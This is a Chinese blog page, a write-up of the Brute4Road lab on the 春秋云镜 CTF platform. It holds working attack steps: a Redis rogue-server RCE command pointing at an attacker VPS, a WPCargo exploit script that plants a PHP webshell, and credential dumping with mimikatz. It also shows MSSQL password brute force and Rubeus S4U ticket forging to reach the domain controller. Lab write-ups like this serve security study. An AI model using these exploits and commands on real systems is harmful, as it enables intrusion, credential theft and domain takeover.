@@ -1,0 +1,780 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="春秋云镜 Brute4Road writeup本来想效率高一点的，但是每天起来都下午了，再加上复现的效率较低（这还是照着wp复现的效率。。。。 现在搞得好像每天一刷一样，哈哈哈 由于重置了靶机，再加上有些结果没保存偷的结果，所以不要在意外网过程的ip变化 flag01fscan扫ip  [+] Redis:39.99.130.229:6379 unauthorized file:&#x2F;usr&#x2F;loca">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜 Brute4Road writeup">
+<meta property="og:url" content="https://zer0peach.github.io/2024/11/29/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="春秋云镜 Brute4Road writeup本来想效率高一点的，但是每天起来都下午了，再加上复现的效率较低（这还是照着wp复现的效率。。。。 现在搞得好像每天一刷一样，哈哈哈 由于重置了靶机，再加上有些结果没保存偷的结果，所以不要在意外网过程的ip变化 flag01fscan扫ip  [+] Redis:39.99.130.229:6379 unauthorized file:&#x2F;usr&#x2F;loca">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175512121.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175605325.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175646022.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175834455.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175850818.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129180318794.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129180411656.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000349787.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000323431.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000703200.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130001425658.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130001721257.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130004855618.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130013345003.png">
+<meta property="article:published_time" content="2024-11-29T09:40:49.000Z">
+<meta property="article:modified_time" content="2024-11-29T17:51:33.739Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175512121.png">
+  
+  
+  
+  <title>春秋云镜 Brute4Road writeup - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜 Brute4Road writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-29 17:40" pubdate>
+          2024年11月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜 Brute4Road writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="春秋云镜-Brute4Road-writeup"><a href="#春秋云镜-Brute4Road-writeup" class="headerlink" title="春秋云镜 Brute4Road writeup"></a>春秋云镜 Brute4Road writeup</h1><p>本来想效率高一点的，但是每天起来都下午了，再加上复现的效率较低（这还是照着wp复现的效率。。。。</p>
+<p>现在搞得好像每天一刷一样，哈哈哈</p>
+<p>由于重置了靶机，再加上有些结果没保存偷的结果，所以不要在意外网过程的ip变化</p>
+<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫ip</p>
+<div class="code-wrapper"><pre><code class="hljs gradle">
+[+] Redis:<span class="hljs-number">39.99</span>.<span class="hljs-number">130.229</span>:<span class="hljs-number">6379</span> unauthorized <span class="hljs-keyword">file</span>:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>db/<span class="hljs-keyword">dump</span>.rdb
+[+] ftp:<span class="hljs-comment">//39.99.130.229:21:anonymous</span>
+   [-&gt;]pub
+已完成 <span class="hljs-number">4</span>/<span class="hljs-number">4</span>
+[*] 扫描结束,耗时: <span class="hljs-number">36.850577042</span>s</code></pre></div>
+
+<p><code>redis-cli -h ip </code>连过去能发现是5.x版本</p>
+<p>redis主从复制rce</p>
+<p>使用已知脚本，<code>redis-rce</code>或者<code>redis-rogue-server.py</code></p>
+<div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">39.99</span>.<span class="hljs-number">149.30</span> -L vps_ip -<span class="hljs-keyword">f</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">so</span></code></pre></div>
+
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175512121.png" srcset="/img/loading.gif" lazyload alt="image-20241129175512121"></p>
+<div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;*flag*&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span></code></pre></div>
+
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175605325.png" srcset="/img/loading.gif" lazyload alt="image-20241129175605325"></p>
+<p>没有读取权限</p>
+<p>查看suid提权</p>
+<p>发现个base64，加密后再解密就行</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175646022.png" srcset="/img/loading.gif" lazyload alt="image-20241129175646022"></p>
+<h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>然后就下载fscan，frp等工具，探测内网</p>
+<p>先看一下ip，这里有一个问题，看了一些wp，他们说不存在ifconfig等查看ip的命令</p>
+<p>但是我有。。。。。</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175834455.png" srcset="/img/loading.gif" lazyload alt="image-20241129175834455"></p>
+<p>fscan扫描</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129175850818.png" srcset="/img/loading.gif" lazyload alt="image-20241129175850818"></p>
+<div class="code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.2.3</span> #DC
+<span class="hljs-number">172.22.2.7</span> #本机
+<span class="hljs-number">172.22.2.16</span> # MSSQLSERVER
+<span class="hljs-number">172.22.2.18</span> # workgroup\ubuntu-web02
+<span class="hljs-number">172.22.2.34</span> # client01</code></pre></div>
+
+<p>看wordpress</p>
+<p>搭建代理</p>
+<p>上wpscan扫描</p>
+<p>X1r0z大佬说</p>
+<blockquote>
+<p>wordpress 一般都是先从插件入手, 实在不行了再去爆破用户名密码</p>
+</blockquote>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129180318794.png" srcset="/img/loading.gif" lazyload alt="image-20241129180318794"></p>
+<p>扫出wpcargo插件存在漏洞</p>
+<p>去官网找exp</p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> binascii
+<span class="hljs-keyword">import</span> requests
+
+<span class="hljs-comment"># This is a magic string that when treated as pixels and compressed using the png</span>
+<span class="hljs-comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span>
+payload = <span class="hljs-string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_character_code</span>(<span class="hljs-params">c: <span class="hljs-built_in">int</span></span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c).replace(<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>)
+
+text = <span class="hljs-string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> binascii.unhexlify(payload)])[<span class="hljs-number">1</span>:]
+
+destination_url = <span class="hljs-string">&#x27;http://172.22.2.18/&#x27;</span>
+cmd = <span class="hljs-string">&#x27;ls&#x27;</span>
+
+<span class="hljs-comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span>
+requests.get(
+    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="hljs-subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span>
+)
+
+<span class="hljs-comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span>
+<span class="hljs-built_in">print</span>(requests.post(
+    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="hljs-string">&quot;2&quot;</span>: cmd&#125;
+).content.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>))</code></pre></div>
+
+<p>蚁剑连接时，连接类型改为<code>CMDLINUX</code>，别问，问就是看wp</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241129180411656.png" srcset="/img/loading.gif" lazyload alt="image-20241129180411656"></p>
+<p>省时间，直接找到wp-config.php查看数据库用户和密码</p>
+<div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">wpuser</span>
+WpuserEha8Fgj9</code></pre></div>
+
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000349787.png" srcset="/img/loading.gif" lazyload alt="image-20241130000349787"></p>
+<h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>查看下其他表</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000323431.png" srcset="/img/loading.gif" lazyload alt="image-20241130000323431"></p>
+<p>一堆密码，导出一下，因该是去mssql中爆破出正确密码</p>
+<p>（注意，点到这个表时他的SQL语句会限制输出数量，记得去掉才能输出全部密码</p>
+<p>可以使用fscan进行mssql的密码爆破</p>
+<p>这里注意加<code>-np</code>参数，绕过icmp，因为他不走代理会扫不出来</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130000703200.png" srcset="/img/loading.gif" lazyload alt="image-20241130000703200"></p>
+<p>上MDUT</p>
+<p>我才知道原来激活Ole xxx组件后就能上传文件了。。。。</p>
+<p>导致我重启了三次靶机，耗了40分钟思考如何把工具传到机子上</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130001425658.png" srcset="/img/loading.gif" lazyload alt="image-20241130001425658"></p>
+<p>然后经典SweetPotato提权</p>
+<p>读取flag03</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130001721257.png" srcset="/img/loading.gif" lazyload alt="image-20241130001721257"></p>
+<h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>开了3389端口，可以rdp上去</p>
+<p>弄一个管理员账号</p>
+<div class="code-wrapper"><pre><code class="hljs sql">net <span class="hljs-keyword">user</span> zeropeach whoami<span class="hljs-variable">@666</span> <span class="hljs-operator">/</span><span class="hljs-keyword">add</span>
+net localgroup administrators zeropeach <span class="hljs-operator">/</span><span class="hljs-keyword">add</span></code></pre></div>
+
+<p>看别人都bloodHound信息收集了</p>
+<p>我tm上传后根本运行不了，说是用户不在域中</p>
+<p>看了下，说是机器在域中，但用户不在</p>
+<p>算了偷个图</p>
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130004855618.png" srcset="/img/loading.gif" lazyload alt="image-20241130004855618"></p>
+<p>MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控</p>
+<p>管理员身份运行mimikatz，抓一下机器账户的哈希</p>
+<p>找到这样一部分就行</p>
+<div class="code-wrapper"><pre><code class="hljs ada">* Username : <span class="hljs-type">MSSQLSERVER</span>$
+* Domain   : <span class="hljs-type">XIAORANG</span>
+* NTLM     : <span class="hljs-type">d34af3aa004fa2c45e4ea2b59dde8fbc</span>
+* SHA1     : 709101<span class="hljs-type">e5535f4c2e0ca6110a14e0808823d456c4</span></code></pre></div>
+
+<p>使用Rubeus工具 用S4U申请ST票据</p>
+<div class="code-wrapper"><pre><code class="hljs awk">Rubeus.exe asktgt <span class="hljs-regexp">/user:MSSQLSERVER$ /</span>rc4:d34af3aa004fa2c45e4ea2b59dde8fbc <span class="hljs-regexp">/domain:xiaorang.lab /</span>dc:DC.xiaorang.lab /nowrap &gt; <span class="hljs-number">1</span>.txt
+
+
+Rubeus.exe s4u <span class="hljs-regexp">/impersonateuser:Administrator /m</span>sdsspn:CIFS<span class="hljs-regexp">/DC.xiaorang.lab /</span>dc:DC.xiaorang.lab <span class="hljs-regexp">/ptt /</span>ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE0I0rsyzHMIDXYZlu5od9ABhtxFsg4WtvnlPLpJUeKphO5B7q8cD9tBq+cnODz47waC<span class="hljs-regexp">/UzZySXgpaOD5WAxp/</span>nPvgVlSnuZpGfVy5HGXAYrABoogaVRpNCynWElBnebY2l7Pc3lpNunu2hDaKJKzA1LzV+z4oYXoHSGKHipZ7OuH4R5shzwazyg86H1dOMVCjP9MgICBbk26BL0sqIHKeyAdAlBTauufl<span class="hljs-regexp">/wZJapI6cmI2xVuyjnWAwPU003+0yMVsWOlAJp7bf+A+4mjjII3eVTVB2u8BfUe/</span>T4kpakhEPrkP2kW5lah6E5P+DTlTwGsOEVdmqxyNKnCg5D42SIP5BBs1k2Gem2B8yF8kkI<span class="hljs-regexp">/jJbmEABeu1BforMzz4dnjYrc4uYSFY8H8wnl4FlGaYdIldP8DR00V7tI/</span>GwvEl4RZ3uQy<span class="hljs-regexp">/RXS8MtT5sJQyTZvcIKD1kDVmH5E1rTGu+ytsmfYEhJ+46yWoi/</span>LNHtaJkY2kZFDKJfsScqdHJXGi9sFHSGzOHTvPenIKXiIOeWcm2e8arG2RtVzbAgiqTIR2tL5rPkLT6MzuzKzK2BBqsSLJubbgErEo7qMZB4Ufccw4j8k3UgVxVXgYOggRNWl39FVdey2Aqaboc6cXU7p8TZ21NEE0KusCZ2MIjkZiIPmbrGmcmC<span class="hljs-regexp">/jSnP6vw5FbmU67UY8G1YTpkZXcBg67pul2kP7g8LtS4zxFEJ2fWYIGGYMW4oaDi57r4G73I7DhUw1Q19uAb6uhz6dPjxSdiD13fjHift21CImXyjR5DSf2PjgShZhVIQrYBzx3Wm9IR8exKqZg2uq8Z5yw6hHs4n+5Ge4z3skVehsE81o+qWGDKo41L4Q/</span>AkQE2q0BxEJirUvaqq9g+DOAra2<span class="hljs-regexp">//</span>+CnOMvYlO26pMTpqjSzzXey6FL4PTpexRrE+h70FJiF5UT7BArx01Fi727NxMlZdGJTXMEUm<span class="hljs-regexp">/oA9BU6WjrbyOULqZNeehpDIOsqnyOuZ0RIfgvmuFpjmLaSp/u</span>p6ELavD933QmNyaJ8JgETVQxSxbk+bitvcuNGmStcqPuPUS5jzpRgiccwp5TUmQH8i2pI+rDmeehraSAgoTZ+w4p3SWuaAoYj5LQg3I6MOmQKvnjpffaWfpxZpN8xzhRpsWLIG7YRrr<span class="hljs-regexp">/1RPfOX9kMVLtWlH1dUrW8RNL7ZVw/</span>rpJ9fUJdlUiHit1oQ<span class="hljs-regexp">/QSTLs7TSi47H4SD9/</span>bHEW9EaXKLCd<span class="hljs-regexp">/a+2vv0rMSqt1i9XzkSKtAltyou8qmWTzjgV0s1NhX5/</span>LTwo0XwNHv5rUbz1meB19iC5+MpLRQSbV12XCk5wEePzC5m8Uuh4I9WNYJ9w<span class="hljs-regexp">/ce3f8W1pAIEp99T1Mq9xkn3xsZ1alLoXi1/</span>sdKHwgNIeJoNdZZaCCeIFr0aizm8opUIz15+<span class="hljs-regexp">/pC5UGjpYXLGiQNq2xSajKcJ0Vydf8z2rQ/</span>nk0LKvzxktO+veagqdm8zLlcQiqv9<span class="hljs-regexp">/nBl2j/</span>SjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDzHs/yjGOOHZhfZVz2E8txoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MTEyOTA4NTQzMlqmERgPMjAyNDExMjkxODU0MzJapxEYDzIwMjQxMjA2MDg1NDMyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
+</code></pre></div>
+
+<p>这样就成功导入票据</p>
+<p>当然也可以把base64 ticket转为ccache，然后横向过去</p>
+<div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=ticket.ccache
+proxychains4 wmiexec.py DC.xiaorang.lab -k -no-pass -dc-ip 172.22.2.3</code></pre></div>
+
+
+
+<p>就可以访问DC了</p>
+<div class="code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> \\DC.xiaorang.lab\c$\users\administrator\flag\flag04.txt</code></pre></div>
+
+<p><img src="/../images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-writeup/image-20241130013345003.png" srcset="/img/loading.gif" lazyload alt="image-20241130013345003"></p>
+<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>看了大佬使用红队工具CS或者viper有个集中管理的应用</p>
+<p>但是不会用，就先这样吧</p>
+<p>又没用上bloodhound的一集</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜 Brute4Road writeup</div>
+      <div>https://zer0peach.github.io/2024/11/29/春秋云镜-Brute4Road-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/" title="春秋云镜 Time">
+                        <span class="hidden-mobile">春秋云镜 Time</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
